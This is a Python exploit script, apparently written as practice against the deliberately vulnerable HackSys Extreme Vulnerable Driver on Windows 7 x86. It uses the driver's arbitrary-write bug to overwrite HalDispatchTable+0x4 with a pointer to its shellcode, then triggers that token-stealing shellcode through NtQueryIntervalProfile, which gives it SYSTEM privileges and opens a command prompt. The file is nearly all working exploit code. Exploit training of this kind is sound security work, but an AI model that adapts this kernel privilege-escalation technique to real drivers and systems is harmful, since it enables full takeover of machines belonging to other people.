#######################################################
# Purpose: Win7 x86 HEVD Arbitrary Overwrite          #
# Written By: Eric Van Zutphen                        #
#######################################################
import struct, sys
from ctypes import *
from subprocess import *


#Function Proxies
kernel32 = windll.kernel32
ntdll = windll.ntdll
GetProcAddress = windll.kernel32.GetProcAddress
ProcessStatusAPI = windll.psapi
VirtualAlloc = windll.kernel32.VirtualAlloc

#Constants
PAGE_EXECUTE_READWRITE = 0x00000040
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000


class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

def banner():
    logo = """
HEVD - HackSys Exteme Vulnerable Driver
Bug: Arbitrary Overwrite
Written By: Eric Van Zutphen
Platform: Windows 7 X86
    """
    return logo


def debug_print(message):
    print(message)

    # void WINAPI OutputDebugString(
    #   _In_opt_ LPCTSTR lpOutputString
    # );

    kernel32.OutputDebugStringA(message + "\n")

def close_handle(handle):
    # BOOL WINAPI CloseHandle(
    #   _In_ HANDLE hObject
    # );

    # close the device handle
    return kernel32.CloseHandle(handle)

def get_device_handle(device):
    open_existing = 0x3
    generic_read = 0x80000000
    generic_write = 0x40000000

    # HANDLE WINAPI CreateFile(
    #   _In_     LPCTSTR               lpFileName,
    #   _In_     DWORD                 dwDesiredAccess,
    #   _In_     DWORD                 dwShareMode,
    #   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    #   _In_     DWORD                 dwCreationDisposition,
    #   _In_     DWORD                 dwFlagsAndAttributes,
    #   _In_opt_ HANDLE                hTemplateFile
    # );

    # get the device handle
    handle = kernel32.CreateFileA(device,
                                  generic_read | generic_write,
                                  None,
                                  None,
                                  open_existing,
                                  None,
                                  None)

    if not handle:
        debug_print("\t[*] Unable to get device handle")
        sys.exit(-1)
    return handle

def get_hal_dispatch_table():
    global HAL_plus_4
    cb = c_int(1024)
    cb_needed = c_long()
    image_base = (c_ulong * 1024)()
    # BOOL WINAPI EnumDeviceDrivers(
    # _Out_ LPVOID  *lpImageBase,
    #   _In_  DWORD   cb,
    #   _Out_ LPDWORD lpcbNeeded
    # );
    # enumerate the loaded device drivers
    #Enumerate for the HALDispatchTable
    enumerate = ProcessStatusAPI.EnumDeviceDrivers(byref(image_base), cb, byref(cb_needed))
    if not enumerate:
        print "[*] Enumeration Device Drivers Failed! [*]"
        sys.exit(-1)
    for address in image_base:
        if not address:
            continue
        get_base_name = c_char_p('\x00' * 1024)
        # DWORD WINAPI GetDeviceDriverBaseName(
        #   _In_  LPVOID ImageBase,
        #   _Out_ LPTSTR lpBaseName,
        #   _In_  DWORD  nSize
        # );
        ProcessStatusAPI.GetDeviceDriverBaseNameA.argtypes = [c_long, POINTER(c_char), c_uint32]
        get_driver_base_name =  ProcessStatusAPI.GetDeviceDriverBaseNameA(address, get_base_name, 48)
        if not get_driver_base_name:
            print "[*] Unable to Get Driver Base Name [*]"
            sys.exit(-1)
        if get_base_name.value.lower() == 'krnl' or 'krnl' in get_base_name.value.lower():
            base_name = get_base_name.value
            print "[*] Loaded Kernel: {0} ".format(base_name)
            print "[*] Base Address of Loaded Kernel: {0} ".format(hex(address))
            break
        else:
            print "[*] Unable to Get Kernel Base Name [*]"
    
    kernel32.LoadLibraryExA.restype = c_uint32
    kernel_handle = kernel32.LoadLibraryExA(base_name, None, 0x00000001)
    if not kernel_handle:
        print "Unable to get Kernel Handle"
        sys.exit(-1)
    GetProcAddress.argtypes = [c_uint32, POINTER(c_char)]
    GetProcAddress.restype = c_uint32
    hal_address = GetProcAddress(kernel_handle,"HalDispatchTable")
    # Subtracting ntkrnlpa base in user space
    hal_address -= kernel_handle 
    # To find the HalDispatchTable address in kernel space, add the base address of ntkrnpa in kernel space
    hal_address += address
    # Just add 0x4 to HAL address for HalDispatchTable+0x4
    HAL_plus_4 = hal_address + 0x4
    print "[+] HalDispatchTable    : {0}".format(hex(hal_address))
    print "[+] HalDispatchTable+0x4: {0}".format(hex(HAL_plus_4))

def send_ioctl_code(ioctl_code,inbuf):
    global device_handle
    bytes_returned = c_ulong()
    inputbuffer = inbuf
    ioctl = ioctl_code
    device_name = "\\\\.\\HackSysExtremeVulnerableDriver"
    device_handle = get_device_handle(device_name)
    success = kernel32.DeviceIoControl(device_handle,ioctl,inputbuffer,0x8,None,0,byref(bytes_returned),None)
    if not close_handle(device_handle):
        debug_print("\t[-] Unable to close device handle")

def write_shellcode():
    global shellcode
    global ptr
    #System Token Stealing Payload
    print "[+] Writing Stealing SYSTEM Token To Memory"
    shellcode = bytearray(
        "\x90\x90\x90\x90"            # Nop Sled
        "\x60"                            # pushad
        "\x31\xc0"                        # xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]         |Offset to _EProcess
        "\x89\xc1"                        # mov ecx,eax                |Copy _EProcess into ecx
        "\xba\x04\x00\x00\x00"            # mov edx,0x4                |SYSTEM PID Always 4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]         |Search for SYSTEM Process
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8 
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx         |Compare if PID == 4
        "\x75\xed"                        # jnz 0x1a                   |Jump Back to Search Function if PID != 4
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]         |Copy SYSTEM Token into EDX
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx         |Overwrite with System Token
        "\x61"                            # popad
        "\x31\xc0"                        # xor eax,eax
        "\x83\xc4\x24"            # add esp, 0x24
        "\x5d"                            # pop ebp                    |Restore Original Resgisters to Resume Execution Flow
        "\xc2\x08\x00"                    # ret 0x8
        )                            
    #---------------------------------------------------------[Structure]-#
    # LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
    #   _In_opt_  LPVOID lpAddress,       => None                         #
    #   _In_      SIZE_T dwSize,          => dwSize (??) Shellcode Length #
    #   _In_      DWORD flAllocationType, => flAllocationType (0x3000)    #
    #   _In_      DWORD flProtect         => flProtect (0x40) Page Execute#
    # );                                                                  #
    #---------------------------------------------------------------------#
    ptr = VirtualAlloc(None,len(shellcode),(MEM_COMMIT|MEM_RESERVE),PAGE_EXECUTE_READWRITE)   
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))


if __name__ == '__main__':
    banner()
    write_shellcode()
    shellcode_address = id(shellcode) + 20
    shellcode_final = struct.pack("<L",ptr)
    shellcode_final_address = id(shellcode_final) + 20 
    print "[+] Address of ring0 shellcode: {0}".format(hex(shellcode_address))
    print "[+] Pointer for ring0 shellcode: {0}".format(hex(shellcode_final_address))
    get_hal_dispatch_table()
    www = WriteWhatWhere()
    www.What = shellcode_final_address
    www.Where = HAL_plus_4
    exploit = pointer(www)
    #exploit = "A"*4
    debug_print("[+] What : {0}".format(hex(www.What)))
    debug_print("[+] Where: {0}".format(hex(www.Where)))
    ioctl = 0x22200b
    send_ioctl_code(ioctl, exploit)
    #Trigger NtQueryIntervalProfile 
    ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))
    Popen("start cmd", shell=True)
    debug_print("[+] Arbitrary Memory Overwrite Complete")
    debug_print("[+] Check Privileges...")
